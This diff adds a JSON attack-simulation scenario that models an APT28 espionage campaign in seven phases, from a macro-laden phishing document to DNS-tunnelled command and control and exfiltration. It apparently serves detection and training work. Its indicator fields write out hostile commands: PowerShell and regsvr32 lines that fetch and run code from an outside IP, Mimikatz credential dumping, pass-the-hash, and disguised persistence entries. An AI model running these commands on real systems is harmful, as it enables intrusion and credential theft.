@@ -1,0 +1,182 @@
+{
+  "id": "sc-apt-campaign-001",
+  "name": "APT28 Fancy Bear — Long-Term Espionage Campaign",
+  "description": "A multi-stage, long-term espionage campaign modeled on APT28 (Fancy Bear) operations. The attack spans initial access via spear phishing with a malicious Word document, implant deployment (X-Agent/Sofacy), LSASS credential dumping, domain reconnaissance, lateral movement to sensitive servers, long-term C2 via DNS tunneling (using GoSNRATT), and stealthy data exfiltration via encrypted HTTPS beaconing to CDN-fronted C2 infrastructure.",
+  "severity": "critical",
+  "category": "apt",
+  "threat_actor": {
+    "name": "APT28",
+    "aliases": ["Fancy Bear", "Sofacy", "Pawn Storm", "STRONTIUM", "Forest Blizzard"],
+    "origin": "Russia (GRU Unit 26165)",
+    "motivation": "Nation-state espionage, election interference",
+    "active_since": "2004"
+  },
+  "mitre_techniques_summary": [
+    "T1566.001", "T1204.002", "T1059.001", "T1547.001",
+    "T1003.001", "T1071.004", "T1573.001", "T1083",
+    "T1005", "T1041", "T1070.004"
+  ],
+  "references": [
+    "https://attack.mitre.org/groups/G0007/",
+    "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/",
+    "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-296a"
+  ],
+  "kill_chain": ["reconnaissance", "weaponization", "delivery", "exploitation", "installation", "command_and_control", "actions_on_objectives"],
+  "phases": [
+    {
+      "phase": 1,
+      "name": "Spear Phishing with Malicious Word Document (Macro)",
+      "description": "APT28 sends a spear phishing email with a Word document containing a malicious VBA macro that executes a PowerShell stager. The document impersonates a NATO briefing document targeting a defense contractor executive.",
+      "technique_id": "T1566.001",
+      "technique_name": "Phishing: Spearphishing Attachment",
+      "tactic": "Initial Access",
+      "target_host": "ws-exec-01",
+      "target_user": "jean.dupont",
+      "delay_seconds": 0,
+      "stealth_level": "high",
+      "indicators": {
+        "sender": "nato-briefings@europacouncil-documents.eu",
+        "subject": "RESTRICTED: NATO Exercise Trident Juncture 2024 Briefing",
+        "domain": "europacouncil-documents.eu",
+        "attachment": "NATO_Exercise_Brief_2024_RESTRICTED.docx",
+        "url": "https://europacouncil-documents.eu/track/open"
+      },
+      "ioc": {
+        "domains": ["europacouncil-documents.eu", "nato-updates.org"],
+        "ips": ["195.133.196.214"],
+        "file_hashes": {
+          "doc_sha256": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
+        }
+      }
+    },
+    {
+      "phase": 2,
+      "name": "Macro Execution — PowerShell Dropper",
+      "description": "The VBA macro executes a PowerShell command that downloads and executes the X-Agent (Sofacy) implant from a CDN-fronted C2 server. The implant is injected into explorer.exe via process hollowing.",
+      "technique_id": "T1059.001",
+      "technique_name": "Command and Scripting Interpreter: PowerShell",
+      "tactic": "Execution",
+      "target_host": "ws-exec-01",
+      "target_user": "jean.dupont",
+      "delay_seconds": 60,
+      "stealth_level": "high",
+      "indicators": {
+        "source_ip": "195.133.196.214",
+        "commands": [
+          "powershell -enc JABj...(base64)... -ExecutionPolicy Bypass -WindowStyle Hidden",
+          "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('https://195.133.196.214/update.ps1')\"",
+          "regsvr32 /s /n /u /i:http://195.133.196.214/update.sct scrobj.dll"
+        ]
+      },
+      "ioc": {
+        "ips": ["195.133.196.214"],
+        "tools": ["Sofacy/X-Agent", "Mimikatz"],
+        "techniques": ["Process Hollowing", "DLL Side-Loading"]
+      }
+    },
+    {
+      "phase": 3,
+      "name": "Persistence via Registry Run Key",
+      "description": "X-Agent implant installs itself in the registry Run key (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) and schedules a task disguised as a Windows Update component for resilience.",
+      "technique_id": "T1547.001",
+      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys",
+      "tactic": "Persistence",
+      "target_host": "ws-exec-01",
+      "target_user": "jean.dupont",
+      "delay_seconds": 120,
+      "stealth_level": "high",
+      "indicators": {
+        "commands": [
+          "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdateCheck /t REG_SZ /d C:\\Users\\jean.dupont\\AppData\\Local\\Temp\\wupdate.exe /f",
+          "schtasks /create /tn \"WindowsDefenderUpdate\" /tr \"C:\\Windows\\Temp\\svchost32.exe\" /sc onlogon /ru SYSTEM"
+        ]
+      }
+    },
+    {
+      "phase": 4,
+      "name": "Credential Access — LSASS Dump",
+      "description": "X-Agent uses its built-in credential harvesting module to dump LSASS memory via a custom kernel driver that bypasses EDR. Credentials are encrypted and staged for exfiltration.",
+      "technique_id": "T1003.001",
+      "technique_name": "OS Credential Dumping: LSASS Memory",
+      "tactic": "Credential Access",
+      "target_host": "ws-exec-01",
+      "target_user": "jean.dupont",
+      "delay_seconds": 300,
+      "stealth_level": "very_high",
+      "indicators": {
+        "commands": [
+          "xagent --dump-creds --output C:\\Windows\\Temp\\sys.bin",
+          "mimikatz.exe sekurlsa::logonpasswords > C:\\Windows\\Temp\\creds.txt"
+        ]
+      }
+    },
+    {
+      "phase": 5,
+      "name": "DNS Tunneling C2 Communication",
+      "description": "X-Agent communicates with C2 infrastructure via DNS TXT record queries, encoding data in subdomain labels. Beaconing interval is randomized between 15-45 minutes with jitter to evade behavioral detection.",
+      "technique_id": "T1071.004",
+      "technique_name": "Application Layer Protocol: DNS",
+      "tactic": "Command and Control",
+      "target_host": "ws-exec-01",
+      "target_user": "jean.dupont",
+      "delay_seconds": 600,
+      "stealth_level": "very_high",
+      "indicators": {
+        "domain": "updates.windows-telemetry-svc.com",
+        "query_type": "TXT",
+        "commands": [
+          "Encoded C2 beacon: aHR0cHM6Ly91cGRhdGVzLndpbmRvd3MtdGVsZW1ldHJ5LXN2Yy5jb20=",
+          "DNS TXT queries with base64-encoded payload in subdomain labels"
+        ],
+        "source_ip": ""
+      },
+      "ioc": {
+        "domains": ["updates.windows-telemetry-svc.com", "cdn-updates.microsoft-update.net"],
+        "ips": ["195.133.196.215"]
+      }
+    },
+    {
+      "phase": 6,
+      "name": "Lateral Movement to Sensitive Research Server",
+      "description": "Using harvested domain admin credentials, the attacker moves laterally to the R&D file server and the executive SharePoint instance using PtH (Pass-the-Hash) with the NTLM hash.",
+      "technique_id": "T1021.002",
+      "technique_name": "Remote Services: SMB/Windows Admin Shares",
+      "tactic": "Lateral Movement",
+      "target_host": "srv-file-01",
+      "target_user": "administrator",
+      "source_host": "ws-exec-01",
+      "delay_seconds": 900,
+      "stealth_level": "high",
+      "indicators": {
+        "source_internal_ip": "10.0.1.50",
+        "target_ip": "10.0.1.10",
+        "commands": [
+          "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe",
+          "net use \\\\10.0.1.10\\IPC$ /user:administrator"
+        ]
+      }
+    },
+    {
+      "phase": 7,
+      "name": "Long-Term Data Collection and Exfiltration",
+      "description": "Over several weeks, the implant silently exfiltrates documents, emails, and keylogger output. Data is compressed, encrypted with RSA-2048, and exfiltrated in small chunks disguised as HTTPS telemetry traffic to a CDN-fronted C2.",
+      "technique_id": "T1041",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "tactic": "Exfiltration",
+      "target_host": "srv-file-01",
+      "target_user": "administrator",
+      "delay_seconds": 1800,
+      "stealth_level": "very_high",
+      "indicators": {
+        "destination_ip": "195.133.196.215",
+        "data_size_mb": 2400,
+        "external_ip": "195.133.196.215",
+        "upload_size_mb": 2400
+      },
+      "ioc": {
+        "ips": ["195.133.196.215"],
+        "domains": ["cdn-updates.microsoft-update.net"]
+      }
+    }
+  ]
+}
